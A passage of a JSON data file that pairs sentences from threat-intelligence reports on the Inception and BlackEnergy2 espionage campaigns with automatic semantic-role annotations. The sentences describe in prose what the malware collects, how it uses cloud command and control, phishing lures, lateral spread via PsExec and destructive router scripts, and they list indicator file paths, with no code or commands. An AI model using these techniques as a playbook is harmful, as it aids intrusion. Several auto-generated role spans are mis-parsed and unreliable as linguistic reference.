"persistence on victim computers"}}}, "\n\n\nOnce installed, it may collect\n<list>\n   \u2022   Device platform, name, model, system name, system version\n   \u2022   ICCID\n   \u2022   User\u2019s address book\n   \u2022   Roaming status\n   \u2022   Phone number\n   \u2022   Carrierbundlename\n   \u2022   Iso country name\n   \u2022   Carrier name\n   \u2022   Wifi status\n   \u2022   MAC address\n   \u2022   Device battery level\n   \u2022   Free and total space\n   \u2022   Cpu frequency and count\n   \u2022   Total and user memory\n   \u2022   Maxsocketbuffersize\n   \u2022   Language local identifier and language display name\n   \u2022   Default and local time zone\n   \u2022   Account data: AccountAvailableServiceTypes, AccountKind,\n       AccountSocialEnabled, etc\n   \u2022   AppleID\n   \u2022   CreditDisplayString\n   \u2022   DSPersonID\n   \u2022   IOS specific data; ex LastBackupComputerName,\n       LastBackupComputerType, iTunes.store-UserName, iTunes.store-\n       downloaded-apps etc": {"installed": {"ARGM-TMP": {"text": "Once"}, "V": {"text": "installed", "index": 1}, "ARG1": {"text": "AccountAvailableServiceTypes , AccountKind/ AccountSocialEnabled , etc \u2022 AppleID \u2022 CreditDisplayString \u2022 DSPersonID \u2022 IOS"}}, "may": {"ARGM-ADV": {"text": "Once installed"}, "ARG1": {"text": "it/ collect \u2022 Device platform , name , model , system name , system version \u2022 ICCID \u2022 User \u2019s address book \u2022 Roaming status \u2022 Phone number \u2022 Carrierbundlename \u2022 Iso country name \u2022 Carrier name \u2022 Wifi status \u2022 MAC address \u2022 Device battery level \u2022 Free and total space \u2022 Cpu frequency/ LastBackupComputerType , iTunes.store - UserName , iTunes.store- downloaded - apps etc"}, "V": {"text": "may", "index": 4}}, "collect": {"ARGM-ADV": {"text": "Once installed"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "collect", "index": 5}, "ARG1": {"text": "\u2022 Device platform , name , model , system name , system version \u2022 ICCID \u2022 User \u2019s address book \u2022 Roaming status \u2022 Phone number \u2022 Carrierbundlename \u2022 Iso country name \u2022 Carrier name \u2022 Wifi status \u2022 MAC address \u2022 Device battery level \u2022 Free/ LastBackupComputerType , iTunes.store - UserName , iTunes.store- downloaded - apps etc"}}, "Roaming": {"ARG0": {"text": ", system version \u2022 ICCID \u2022 User \u2019s address book \u2022/ - apps etc"}, "V": {"text": "Roaming", "index": 27}, "ARG1": {"text": "status \u2022 Phone number"}}, "count": {"V": {"text": "count", "index": 60}, "ARG1": {"text": "\u2022/ Total"}}, "Maxsocketbuffersize": {"ARG1": {"text": "user"}, "V": {"text": "Maxsocketbuffersize", "index": 67}}, "AccountSocialEnabled": {"V": {"text": "AccountSocialEnabled", "index": 90}}, "CreditDisplayString": {"V": {"text": "CreditDisplayString", "index": 96}, "ARG1": {"text": "\u2022 DSPersonID \u2022 IOS specific data"}}, "DSPersonID": {"V": {"text": "DSPersonID", "index": 98}, "ARG2": {"text": "\u2022 IOS"}, "ARG1": {"text": "specific data"}}, "downloaded": {"V": {"text": "downloaded", "index": 114}}}, " The communication\nbetween the attacker and the SOCKSS is encoded using the RC4 key": {"is": {"V": {"text": "is", "index": 8}}, "encoded": {"ARG1": {"text": "The communication between the attacker and the SOCKSS"}, "V": {"text": "encoded", "index": 9}, "ARGM-MNR": {"text": "using the RC4 key"}}, "using": {"V": {"text": "using", "index": 10}, "ARG1": {"text": "the RC4 key"}}}, " As with other plugins, these are downloaded and deleted from the\nshare in one go": {"are": {"ARG1": {"text": "these"}, "V": {"text": "are", "index": 6}, "ARG2": {"text": "downloaded and deleted"}}, "downloaded": {"ARGM-ADV": {"text": "As with other plugins"}, "ARG1": {"text": "these"}, "V": {"text": "downloaded", "index": 7}, "ARGM-LOC": {"text": "in one go"}}, "deleted": {"ARGM-ADV": {"text": "As with other plugins"}, "ARG1": {"text": "these"}, "V": {"text": "deleted", "index": 9}, "ARG2": {"text": "from the share"}, "ARGM-LOC": {"text": "in one go"}}}, " 922.bin\ncompiles a dirwalk \u2013 a complete listing of every file path \u2013 of each fixed drive": {"compiles": {"ARG0": {"text": "922.bin"}, "V": {"text": "compiles", "index": 1}, "ARG1": {"text": "a dirwalk \u2013 a complete listing of every file path \u2013 of each fixed drive"}}, "fixed": {"V": {"text": "fixed", "index": 15}, "ARG1": {"text": "drive"}}}, "\nExploitation of vulnerabilities in this file format is leveraged to gain remote access\nto victim\u2019s computers": {"is": {"ARG1": {"text": "Exploitation of vulnerabilities in this file format"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "leveraged to gain remote access to victim \u2019s computers"}}, "leveraged": {"ARG1": {"text": "Exploitation of vulnerabilities in this file format"}, "V": {"text": "leveraged", "index": 8}, "ARGM-PRP": {"text": "to gain remote access to victim \u2019s computers"}}, "gain": {"ARG0": {"text": "Exploitation of"}, "V": {"text": "gain", "index": 10}, "ARG1": {"text": "remote access to victim \u2019s computers"}}}, "\n\nThe apparent main purpose of this malware is to record phone call audio": {"is": {"ARG1": {"text": "The apparent main purpose of this malware"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "to record phone call audio"}}, "record": {"V": {"text": "record", "index": 9}, "ARG1": {"text": "phone call audio"}}}, "\n\nUpon execution the binary uses its hardcoded key to decrypt the configuration\nsection and retrieve the listening port to use for incoming connections": {"uses": {"ARGM-TMP": {"text": "Upon execution"}, "ARG0": {"text": "the binary"}, "V": {"text": "uses", "index": 4}, "ARG1": {"text": "its hardcoded key"}, "ARG2": {"text": "to decrypt the configuration section"}}, "decrypt": {"ARG0": {"text": "the binary"}, "V": {"text": "decrypt", "index": 9}, "ARG1": {"text": "the configuration section"}}, "retrieve": {"ARGM-TMP": {"text": "Upon execution"}, "ARG0": {"text": "the binary"}, "V": {"text": "retrieve", "index": 14}, "ARG1": {"text": "the listening port to use for incoming connections"}}, "use": {"ARG1": {"text": "the listening port"}, "V": {"text": "use", "index": 19}, "ARG2": {"text": "for incoming connections"}}}, " When decrypted, these turned out to be dropper\npackages containing one dropper executable clearly created for the Inception\nframework, and one other, very different executable": {"decrypted": {"ARGM-TMP": {"text": "When"}, "V": {"text": "decrypted", "index": 1}}, "turned": {"ARGM-TMP": {"text": "When decrypted"}, "ARG1": {"text": "these"}, "V": {"text": "turned", "index": 4}, "C-ARG1": {"text": "to be dropper packages containing one dropper executable clearly created for the Inception framework , and one other , very different executable"}}, "be": {"ARG1": {"text": "these"}, "V": {"text": "be", "index": 7}, "ARG2": {"text": "dropper packages"}}, "containing": {"ARG0": {"text": "dropper packages"}, "V": {"text": "containing", "index": 10}, "ARG1": {"text": "one dropper executable clearly created for the Inception framework , and one other , very different executable"}}, "created": {"ARG1": {"text": "one dropper executable"}, "ARGM-MNR": {"text": "clearly"}, "V": {"text": "created", "index": 15}, "ARGM-PNC": {"text": "for the Inception framework"}}}, " In this account there was hidden another encrypted\nconfiguration file which the malware downloaded and decrypted": {"was": {"ARGM-LOC": {"text": "In this account"}, "V": {"text": "was", "index": 4}, "ARG1": {"text": "hidden another encrypted configuration file which the malware downloaded and decrypted"}}, "hidden": {"ARGM-LOC": {"text": "In this account"}, "V": {"text": "hidden", "index": 5}, "ARG1": {"text": "another encrypted configuration file which the malware downloaded and decrypted"}}, "encrypted": {"V": {"text": "encrypted", "index": 7}, "ARG1": {"text": "configuration file"}}, "downloaded": {"R-ARG1": {"text": "which"}, "ARG0": {"text": "the malware"}, "V": {"text": "downloaded", "index": 13}}, "decrypted": {"ARG1": {"text": "another encrypted configuration file"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "the"}, "V": {"text": "decrypted", "index": 15}}}, " This document\nwas presumably obtained by the attackers and repurposed for the attack": {"was": {"V": {"text": "was", "index": 2}}, "obtained": {"ARG1": {"text": "This document"}, "ARGM-ADV": {"text": "presumably"}, "V": {"text": "obtained", "index": 4}, "ARG0": {"text": "by the attackers"}}, "repurposed": {"ARG1": {"text": "This document"}, "ARGM-ADV": {"text": "presumably"}, "V": {"text": "repurposed", "index": 9}, "ARGM-PRP": {"text": "for the attack"}}}, " Most interaction between attackers and their infrastructure is\nperformed via a convoluted network of router proxies and rented hosts": {"is": {"V": {"text": "is", "index": 7}}, "performed": {"ARG0": {"text": "Most interaction between attackers and their infrastructure"}, "V": {"text": "performed", "index": 8}, "ARGM-MNR": {"text": "via a convoluted network of router proxies and rented hosts"}}, "rented": {"V": {"text": "rented", "index": 17}, "ARG1": {"text": "hosts"}}}, "\nCommon across multiple accounts, multiple IP\u2019s, and over time, is that the\nprobable attackers have used a HTTP user-agent of \u201cdavfs2/1.4.6 neon/0.29.6\u201d": {"is": {"ARG1": {"text": "Common across multiple accounts , multiple IP \u2019s , and over time"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "that the probable attackers have used a HTTP user - agent of \u201c davfs2/1.4.6 neon/0.29.6 \u201d"}}, "have": {"V": {"text": "have", "index": 18}}, "used": {"ARG0": {"text": "the probable attackers"}, "V": {"text": "used", "index": 19}, "ARG1": {"text": "a HTTP user - agent of \u201c davfs2/1.4.6 neon/0.29.6 \u201d"}}}, "\n\nThen there is the C&C domain used": {"is": {"ARGM-TMP": {"text": "Then"}, "V": {"text": "is", "index": 2}, "ARG1": {"text": "the C&C domain used"}}, "used": {"ARG1": {"text": "the C&C domain"}, "V": {"text": "used", "index": 6}}}, " Inception has the capacity to perform all steps needed for scouting\nout and exfiltrating data without resorting to traditional hosted command &\ncontrol": {"has": {"ARG0": {"text": "Inception"}, "V": {"text": "has", "index": 1}, "ARG1": {"text": "the capacity to perform all steps needed for scouting out and exfiltrating data without resorting to traditional hosted command & control"}}, "perform": {"ARG0": {"text": "Inception"}, "V": {"text": "perform", "index": 5}, "ARG1": {"text": "all steps needed for scouting out and exfiltrating data"}, "ARGM-MNR": {"text": "without resorting to traditional hosted command & control"}}, "needed": {"ARG1": {"text": "all steps"}, "V": {"text": "needed", "index": 8}, "ARGM-PRP": {"text": "for scouting out and exfiltrating data"}}, "scouting": {"V": {"text": "scouting", "index": 10}, "ARGM-MNR": {"text": "without resorting to traditional hosted command & control"}}, "exfiltrating": {"V": {"text": "exfiltrating", "index": 13}, "ARG1": {"text": "data"}, "ARGM-MNR": {"text": "without resorting to traditional hosted command & control"}}, "resorting": {"ARG0": {"text": "Inception"}, "V": {"text": "resorting", "index": 16}, "ARG1": {"text": "to traditional hosted command & control"}}}, " By using a well-understood APT tool and a known malicious C&C\ndomain name, the attackers permit much clearer attribution": {"using": {"V": {"text": "using", "index": 1}, "ARG1": {"text": "a well - understood APT tool and a known malicious C&C domain name"}, "ARG0": {"text": "the attackers"}}, "understood": {"ARGM-EXT": {"text": "well"}, "V": {"text": "understood", "index": 5}, "ARG1": {"text": "APT tool"}}, "known": {"V": {"text": "known", "index": 10}, "ARG1": {"text": "malicious C&C domain name"}}, "permit": {"ARGM-MNR": {"text": "By using a well - understood APT tool and a known malicious C&C domain name"}, "ARG0": {"text": "the attackers"}, "V": {"text": "permit", "index": 18}, "ARG1": {"text": "much clearer attribution"}}}, "\n\n<figure></figure>\n\n\nIt is believed that the attackers were able to compromise these devices based on\npoor configurations or default credentials": {"is": {"V": {"text": "is", "index": 1}}, "believed": {"V": {"text": "believed", "index": 2}, "ARG1": {"text": "that the attackers were able to compromise these devices based on poor configurations or default credentials"}}, "were": {"ARG1": {"text": "the attackers"}, "V": {"text": "were", "index": 6}, "ARG2": {"text": "able to compromise these devices based on poor configurations or default credentials"}}, "compromise": {"ARG0": {"text": "the attackers"}, "V": {"text": "compromise", "index": 9}, "ARG1": {"text": "these devices based on poor configurations or default credentials"}}, "based": {"ARG1": {"text": "these devices"}, "V": {"text": "based", "index": 12}, "ARG2": {"text": "on poor configurations or default credentials"}}}, " In some cases the organization from which the phishing\nemail originates would appear to be a known associate to the target": {"phishing": {"R-ARG2": {"text": "from which"}, "V": {"text": "phishing", "index": 8}, "ARG1": {"text": "email originates"}}, "would": {"V": {"text": "would", "index": 11}}, "appear": {"ARGM-LOC": {"text": "In some cases"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "appear", "index": 12}, "C-ARG1": {"text": "to be a known associate to the target"}}, "be": {"ARG1": {"text": "the organization from which the phishing email originates"}, "V": {"text": "be", "index": 14}, "ARG2": {"text": "a known associate to the target"}}, "known": {"V": {"text": "known", "index": 16}, "ARG1": {"text": "associate"}}}, "\n\n\n<figure></figure>\n\n<caption>Above: Captured SMTP session, sending the malicious attachment MQ1474.doc</caption>\n\nThis way the attack can be mistaken to come from legitimate businesses and\ntrusted organizations": {"can": {"V": {"text": "can", "index": 4}}, "be": {"V": {"text": "be", "index": 5}}, "mistaken": {"ARGM-MNR": {"text": "This way"}, "ARG1": {"text": "the attack"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "mistaken", "index": 6}, "ARGM-PRP": {"text": "to come from legitimate businesses and trusted organizations"}}, "come": {"ARG1": {"text": "the attack"}, "V": {"text": "come", "index": 8}, "ARG2": {"text": "from legitimate businesses and trusted organizations"}}}, "\n\nThe application impersonates a settings utility": {"impersonates": {"ARG0": {"text": "The application"}, "V": {"text": "impersonates", "index": 2}, "ARG1": {"text": "a settings utility"}}}, "\n\n\n\n<footer>29</footer>\n\f\nMail proxies:\n\nThrough our router monitoring we identified two mail proxies used by the\nattackers": {"identified": {"ARGM-MNR": {"text": "Through our router monitoring"}, "ARG0": {"text": "we"}, "V": {"text": "identified", "index": 8}, "ARG1": {"text": "two mail proxies used by the attackers"}}, "used": {"ARG1": {"text": "two mail proxies"}, "V": {"text": "used", "index": 12}, "ARG0": {"text": "by the attackers"}}}, "\n\nThe framework, thus far, has been using the services of a cloud service provider\nbased in Sweden, CloudMe.com, for its main command-and-control\ninfrastructure": {"has": {"V": {"text": "has", "index": 6}}, "been": {"V": {"text": "been", "index": 7}}, "using": {"ARG0": {"text": "The framework"}, "ARGM-TMP": {"text": "thus far"}, "V": {"text": "using", "index": 8}, "ARG1": {"text": "the services of a cloud service provider based in Sweden , CloudMe.com ,"}, "ARG2": {"text": "for its main command - and - control infrastructure"}}, "based": {"ARG1": {"text": "a cloud service provider"}, "V": {"text": "based", "index": 16}, "ARGM-LOC": {"text": "in Sweden , CloudMe.com"}}}, "\n\nThis application impersonates a Cydia installer, and can only be installed on a\njailbroken phone": {"impersonates": {"ARG0": {"text": "This application"}, "V": {"text": "impersonates", "index": 2}, "ARG1": {"text": "a Cydia installer"}}, "can": {"V": {"text": "can", "index": 8}}, "be": {"V": {"text": "be", "index": 10}}, "installed": {"ARG1": {"text": "This application"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "installed", "index": 11}, "ARG2": {"text": "on a jailbroken phone"}}, "jailbroken": {"V": {"text": "jailbroken", "index": 14}, "ARG1": {"text": "phone"}}}, " Our theory is that this malware is a\nmore typical datastealer, and we have observed that after this type of file is\nplanted on the account, encrypted data uploads from compromised users\nincrease": {"is": {"ARG1": {"text": "Our theory"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "that this malware is a more typical datastealer"}}, "is_2": {"ARG1": {"text": "this malware"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "a more typical datastealer"}}, "have": {"V": {"text": "have", "index": 14}}, "observed": {"ARG0": {"text": "we"}, "V": {"text": "observed", "index": 15}, "ARG1": {"text": "that after this type of file is planted on the account , encrypted data uploads from compromised users increase"}}, "is_3": {"V": {"text": "is", "index": 22}}, "planted": {"ARG1": {"text": "this type of file"}, "V": {"text": "planted", "index": 23}, "ARG2": {"text": "on the account"}}, "encrypted": {"ARGM-TMP": {"text": "after this type of file is planted on the account"}, "V": {"text": "encrypted", "index": 28}, "ARG1": {"text": "data"}, "ARG3": {"text": "from compromised users increase"}}}, " The HTML source code reveals that the encoded portion is\nencapsulated in blog-index tags:\n\n<figure></figure>\n\n\nThe three accounts contain different configuration blocks pointing to C&C servers\napparently located in Poland, Germany and Russia, respectively": {"reveals": {"ARG0": {"text": "The HTML source code"}, "V": {"text": "reveals", "index": 4}, "ARG1": {"text": "that the encoded portion is encapsulated in blog - index tags : The three accounts contain different configuration blocks pointing to C&C servers apparently located in Poland , Germany and Russia , respectively"}}, "encoded": {"V": {"text": "encoded", "index": 7}, "ARG1": {"text": "portion"}}, "is": {"ARG1": {"text": "the encoded portion"}, "V": {"text": "is", "index": 9}, "ARG2": {"text": "encapsulated in blog - index tags"}}, "encapsulated": {"ARG1": {"text": "the encoded portion"}, "V": {"text": "encapsulated", "index": 10}, "ARG2": {"text": "in blog - index tags"}}, "contain": {"ARG0": {"text": "The three accounts"}, "V": {"text": "contain", "index": 20}, "ARG1": {"text": "different configuration blocks pointing to C&C servers apparently located in Poland , Germany and Russia , respectively"}}, "pointing": {"ARG0": {"text": "different configuration blocks"}, "V": {"text": "pointing", "index": 24}, "ARG2": {"text": "to C&C servers apparently located in Poland , Germany and Russia , respectively"}}, "located": {"ARG1": {"text": "C&C servers"}, "ARGM-ADV": {"text": "apparently"}, "V": {"text": "located", "index": 29}, "ARGM-LOC": {"text": "in Poland , Germany and Russia , respectively"}}}, " The one above\ndrops ctfmonrc.dll": {"drops": {"ARG0": {"text": "The one above"}, "V": {"text": "drops", "index": 3}, "ARG1": {"text": "ctfmonrc.dll"}}}, " This means\nthat the attackers must maintain a list of where each of these implants are\ninstalled, as well as what port and key each is configured to use": {"means": {"ARG0": {"text": "This"}, "V": {"text": "means", "index": 1}, "ARG1": {"text": "that the attackers must maintain a list of where each of these implants are installed , as well as what port and key each is configured to use"}}, "must": {"V": {"text": "must", "index": 5}}, "maintain": {"ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "must"}, "V": {"text": "maintain", "index": 6}, "ARG1": {"text": "a list of where each of these implants are installed , as well as what port and key each is configured to use"}}, "are": {"V": {"text": "are", "index": 15}}, "installed": {"ARG2": {"text": "where"}, "ARG1": {"text": "each of these implants"}, "V": {"text": "installed", "index": 16}}, "is": {"ARG1": {"text": "what port and key/ each"}, "V": {"text": "is", "index": 26}, "ARG2": {"text": "configured to use"}}, "configured": {"ARG1": {"text": "what port and key each"}, "V": {"text": "configured", "index": 27}, "ARG4": {"text": "to use"}}, "use": {"V": {"text": "use", "index": 29}}}, "\n\nThe framework is designed in such a way that all post-infection communication\n(i.e": {"is": {"V": {"text": "is", "index": 2}}, "designed": {"ARG1": {"text": "The framework"}, "V": {"text": "designed", "index": 3}, "ARGM-MNR": {"text": "in such a way that all post - infection communication ( i.e"}}}, " As described in Dmitry's 2010 Black DDoS' analysis, a\nconfiguration file is downloaded from the server by main.dll on an infected system": {"described": {"V": {"text": "described", "index": 1}, "ARGM-LOC": {"text": "in Dmitry 's 2010 Black DDoS ' analysis"}}, "is": {"V": {"text": "is", "index": 14}}, "downloaded": {"ARGM-ADV": {"text": "As described in Dmitry 's 2010 Black DDoS ' analysis/ on an infected system"}, "ARG1": {"text": "a configuration file"}, "V": {"text": "downloaded", "index": 15}, "ARG2": {"text": "from the server/ by main.dll"}}}, " And, they revealed that their Cisco routers with different IOS versions were hacked": {"revealed": {"ARGM-DIS": {"text": "And"}, "ARG0": {"text": "they"}, "V": {"text": "revealed", "index": 3}, "ARG1": {"text": "that their Cisco routers with different IOS versions were hacked"}}, "routers": {"ARG0": {"text": "their Cisco"}, "V": {"text": "routers", "index": 7}, "ARG1": {"text": "with different IOS versions"}}, "were": {"V": {"text": "were", "index": 12}}, "hacked": {"ARG1": {"text": "their Cisco routers with different IOS versions"}, "V": {"text": "hacked", "index": 13}}}, " They are consistent and serve as stable IoC:\n<list>\n\n%system32%\\drivers\\winntd_.dat\n%system32%\\drivers\\winntd.dat\n%system32%\\drivers\\wincache.dat\n%system32%\\drivers\\mlang.dat\n%system32%\\drivers\\osver32nt.dat\n%LOCALAPPDATA%\\adobe\\wind002.dat\n%LOCALAPPDATA%\\adobe\\settings.sol\n%LOCALAPPDATA%\\adobe\\winver.dat\n%LOCALAPPDATA%\\adobe\\cache.dat\n</list>\n": {"are": {"ARG1": {"text": "They"}, "V": {"text": "are", "index": 1}, "ARG2": {"text": "consistent"}}, "serve": {"ARG0": {"text": "They"}, "V": {"text": "serve", "index": 4}, "ARG1": {"text": "as stable IoC"}}}, "\n\n<heading>Victim #1</heading>\n\f\nThe BE2 attackers successfully spearphished an organization with an exploit for which there is no current\nCVE, and a metasploit module has been available This email message contained a ZIP archive with EXE\nfile inside that did not appear to be an executable": {"spearphished": {"ARG0": {"text": "The BE2 attackers"}, "ARGM-MNR": {"text": "successfully/ with an exploit for which there is no current CVE"}, "V": {"text": "spearphished", "index": 4}, "ARG1": {"text": "an organization"}}, "is": {"V": {"text": "is", "index": 13}, "ARG1": {"text": "no current CVE"}}, "has": {"V": {"text": "has", "index": 22}}, "been": {"ARG1": {"text": "a metasploit module"}, "V": {"text": "been", "index": 23}, "ARG2": {"text": "available"}}, "contained": {"ARG0": {"text": "This email message"}, "V": {"text": "contained", "index": 28}, "ARG1": {"text": "a ZIP archive with EXE file inside that did not appear to be an executable"}}, "did": {"V": {"text": "did", "index": 37}}, "appear": {"ARGM-NEG": {"text": "not"}, "V": {"text": "appear", "index": 39}, "C-ARG1": {"text": "to be an executable"}}, "be": {"ARG1": {"text": "that"}, "V": {"text": "be", "index": 41}, "ARG2": {"text": "an executable"}}}, " The 'vsnet' plugin was intended to spread and launch a\npayload (BlackEnergy2 dropper itself at the moment) in the local network by using PsExec, as well as\ngaining primary information on the user's computer and network": {"was": {"V": {"text": "was", "index": 5}}, "intended": {"ARG2": {"text": "The ' vsnet ' plugin"}, "V": {"text": "intended", "index": 6}, "ARG1": {"text": "to spread and launch a payload ( BlackEnergy2 dropper itself at the moment ) in the local network by using PsExec , as well as gaining primary information on the user 's computer and network"}}, "spread": {"ARG0": {"text": "The ' vsnet ' plugin"}, "V": {"text": "spread", "index": 8}, "ARG1": {"text": "a payload ( BlackEnergy2 dropper itself"}, "ARGM-TMP": {"text": "at the moment"}, "ARGM-LOC": {"text": ") in the local network"}, "ARGM-MNR": {"text": "by using PsExec , as well as gaining primary information on the user 's computer and network"}}, "launch": {"ARG0": {"text": "The ' vsnet ' plugin"}, "V": {"text": "launch", "index": 10}, "ARG1": {"text": "a payload ( BlackEnergy2 dropper itself"}, "ARGM-TMP": {"text": "at the moment )"}, "ARGM-LOC": {"text": "in the local network"}, "ARGM-MNR": {"text": "by using PsExec , as well as gaining primary information on the user 's computer and network"}}, "using": {"ARG0": {"text": "The ' vsnet ' plugin"}, "V": {"text": "using", "index": 26}, "ARG1": {"text": "PsExec"}}, "gaining": {"ARG0": {"text": "The ' vsnet ' plugin"}, "V": {"text": "gaining", "index": 32}, "ARG1": {"text": "primary information on the user 's computer and network"}}}, " The config files within BE2 contained the settings\nof the company's internal web proxy:\n\f\n\n<figure></figure>\n\n<caption>BE2 config file contains victim's internal proxy</caption>\n\nAs the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system (not seen in\nolder versions \u2013 all plugins were only in-memory), the administrators were able to collect BE2 files from\nthe infected machines": {"contained": {"ARG0": {"text": "The config files within BE2"}, "V": {"text": "contained", "index": 5}, "ARG1": {"text": "the settings of the company 's internal web proxy"}}, "stores": {"ARG0": {"text": "the APT - specific BE2 now"}, "V": {"text": "stores", "index": 23}, "ARG1": {"text": "the downloaded plugins"}, "ARG2": {"text": "in encrypted files on"}}, "downloaded": {"V": {"text": "downloaded", "index": 25}, "ARG1": {"text": "plugins"}}, "encrypted": {"V": {"text": "encrypted", "index": 28}, "ARG1": {"text": "files"}}, "seen": {"ARGM-NEG": {"text": "not"}, "V": {"text": "seen", "index": 35}, "ARGM-LOC": {"text": "in older versions"}}, "were": {"ARG1": {"text": "all plugins"}, "V": {"text": "were", "index": 42}, "ARG2": {"text": "only in - memory )"}}, "were_2": {"ARGM-ADV": {"text": "As the APT - specific BE2"}, "ARGM-CAU": {"text": "now stores the downloaded plugins in encrypted files on the system ( not seen in older versions \u2013 all plugins were only in - memory )"}, "ARG1": {"text": "the administrators"}, "V": {"text": "were", "index": 51}, "ARG2": {"text": "able to collect BE2 files from the infected machines"}}, "collect": {"ARG0": {"text": "the administrators"}, "V": {"text": "collect", "index": 54}, "ARG1": {"text": "BE2 files"}, "ARGM-ADV": {"text": "from the infected machines"}}}, "\nBlackEnergy2 was eventually seen downloading more crimeware plugins - a custom spam plugin and a\nbanking information stealer custom plugin": {"was": {"V": {"text": "was", "index": 1}}, "seen": {"ARGM-TMP": {"text": "eventually"}, "V": {"text": "seen", "index": 3}, "ARG1": {"text": "downloading more crimeware plugins - a custom spam plugin and a banking information stealer custom plugin"}}, "downloading": {"ARG0": {"text": "BlackEnergy2"}, "V": {"text": "downloading", "index": 4}, "ARG1": {"text": "more crimeware plugins - a custom spam plugin and a banking information stealer custom plugin"}}}, " Initially, cybercriminals used BlackEnergy custom\nplugins for launching DDoS attacks": {"used": {"ARGM-TMP": {"text": "Initially"}, "ARG0": {"text": "cybercriminals"}, "V": {"text": "used", "index": 3}, "ARG1": {"text": "BlackEnergy"}, "ARG2": {"text": "custom plugins for launching DDoS attacks"}}, "launching": {"V": {"text": "launching", "index": 8}, "ARG1": {"text": "DDoS attacks"}}}, "\n</section>\n\f\n<section>\n<heading>Appendix: IoC</heading>\n\nWhile BE dropper installs": {"BE": {"V": {"text": "BE", "index": 1}, "ARG2": {"text": "dropper"}}}, " By all appearances, the attackers pushed the 'dstr' module when they\nunderstood that they were revealed, and wanted to hide their presence on the machines": {"pushed": {"ARGM-ADV": {"text": "By all appearances"}, "ARG0": {"text": "the attackers"}, "V": {"text": "pushed", "index": 6}, "ARG1": {"text": "the ' dstr ' module"}, "ARGM-TMP": {"text": "when they understood that they were revealed"}}, "understood": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "they"}, "V": {"text": "understood", "index": 14}, "ARG1": {"text": "that they were revealed"}}, "were": {"V": {"text": "were", "index": 17}}, "revealed": {"ARG1": {"text": "they"}, "V": {"text": "revealed", "index": 18}}, "wanted": {"ARGM-ADV": {"text": "By all appearances"}, "ARG0": {"text": "the attackers"}, "V": {"text": "wanted", "index": 21}, "ARG1": {"text": "to hide their presence on the machines"}}, "hide": {"ARG0": {"text": "the attackers"}, "V": {"text": "hide", "index": 23}, "ARG1": {"text": "their presence"}, "ARGM-LOC": {"text": "on the machines"}}}, " While another crimeware group continues to use BlackEnergy to launch DDoS\nattacks, the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and\nincluded custom plugins and scripts of their own": {"continues": {"ARG0": {"text": "another crimeware group"}, "V": {"text": "continues", "index": 4}, "ARG1": {"text": "to use BlackEnergy to launch DDoS attacks"}}, "use": {"ARG0": {"text": "another crimeware group"}, "V": {"text": "use", "index": 6}, "ARG1": {"text": "BlackEnergy"}, "ARG2": {"text": "to launch DDoS attacks"}}, "launch": {"ARG0": {"text": "another crimeware group"}, "V": {"text": "launch", "index": 9}, "ARG1": {"text": "DDoS attacks"}}, "appears": {"ARGM-ADV": {"text": "While another crimeware group continues to use BlackEnergy to launch DDoS attacks"}, "ARG1": {"text": "the BE2 APT"}, "V": {"text": "appears", "index": 16}, "C-ARG1": {"text": "to have used this tool exclusively throughout 2014 at victim sites and included custom plugins and scripts of their own"}}, "have": {"V": {"text": "have", "index": 18}}, "used": {"ARG0": {"text": "the BE2 APT"}, "V": {"text": "used", "index": 19}, "ARG1": {"text": "this tool"}, "ARGM-MNR": {"text": "exclusively"}, "ARGM-TMP": {"text": "throughout 2014 at victim sites"}}, "included": {"ARGM-ADV": {"text": "While another crimeware group continues to use BlackEnergy to launch DDoS attacks"}, "ARG2": {"text": "the BE2 APT"}, "V": {"text": "included", "index": 29}, "ARG1": {"text": "custom plugins and scripts of their own"}}}, " Though unusual, the ARM module was delivered by the same server and\nit processed the same config file": {"was": {"V": {"text": "was", "index": 6}}, "delivered": {"ARGM-ADV": {"text": "Though unusual"}, "ARG1": {"text": "the ARM module"}, "V": {"text": "delivered", "index": 7}, "ARG0": {"text": "by the same server"}}, "processed": {"ARG0": {"text": "it"}, "V": {"text": "processed", "index": 14}, "ARG1": {"text": "the same config file"}}}, "\n\nThe comment includes a punchy message for \"kasperRsky\":\n\f\n\n<figure></figure>\n\n<caption>BE2 ciscoapi.tcl fragment</caption>\n\nKillint.tcl \u2013 uses Ciscoapi.tcl, implements destroying functions:\n\f\n\n<figure></figure>\n\n<caption>BE2 killint.tcl fragment</caption>\n\nThe script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files": {"includes": {"ARG2": {"text": "The comment"}, "V": {"text": "includes", "index": 2}, "ARG1": {"text": "a punchy message for \" kasperRsky \""}}, "tries": {"ARG0": {"text": "The script"}, "V": {"text": "tries", "index": 13}, "ARG1": {"text": "to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files"}}, "download": {"ARG0": {"text": "The script"}, "V": {"text": "download", "index": 15}, "ARG1": {"text": "ciscoapi.tcl"}, "ARG2": {"text": "from a certain FTP server which served as a storage for BE2 files"}}, "served": {"ARG0": {"text": "a certain FTP server"}, "R-ARG0": {"text": "which"}, "V": {"text": "served", "index": 23}, "ARG1": {"text": "as a storage for BE2 files"}}}, " Why would the attackers need\ninformation on usb and bios characteristics? It suggests that based on a specific USB and BIOS devices,\nthe attackers may upload specific plugins to carry out additional actions": {"would": {"V": {"text": "would", "index": 1}}, "need": {"ARGM-CAU": {"text": "Why"}, "ARGM-MOD": {"text": "would"}, "ARG0": {"text": "the attackers"}, "V": {"text": "need", "index": 4}, "ARG1": {"text": "information on usb and bios characteristics"}}, "suggests": {"ARGM-CAU": {"text": "Why"}, "ARG0": {"text": "It"}, "V": {"text": "suggests", "index": 13}, "ARG1": {"text": "that based on a specific USB and BIOS devices , the attackers may upload specific plugins to carry out additional actions"}}, "based": {"V": {"text": "based", "index": 15}, "ARG2": {"text": "on a specific USB and BIOS devices"}}, 